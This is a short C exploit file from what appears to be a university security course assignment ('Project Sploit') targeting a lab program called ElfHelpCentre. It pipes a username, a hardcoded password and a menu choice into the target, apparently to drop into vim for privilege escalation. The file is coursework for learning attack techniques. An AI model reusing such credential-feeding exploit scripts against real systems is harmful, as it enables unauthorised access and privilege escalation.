/*
 * CPSC 525 - Project Sploit
 * Michelle Nguyen
 *
 * Sploit for ElfHelpCentre Problem, open in vim the nice file. 
 * 
 * */


#include <stdio.h>

int main(int argc, char * argv[])
{
	// Popen sud0 with /usr/bin/sud0 and run whoami
	FILE * fp = popen("/home/michelle.nguyen3/ElfHelpCentre", "w");
	// Input the found password
	fputs("BuddyElf\n", fp);
    fputs("Thi$E1fisDefinitet1yNotOnYourShe1f$\n", fp);
    fputs("1avim\n", fp);
	// Close the stream
	pclose(fp);
	return 0;
}
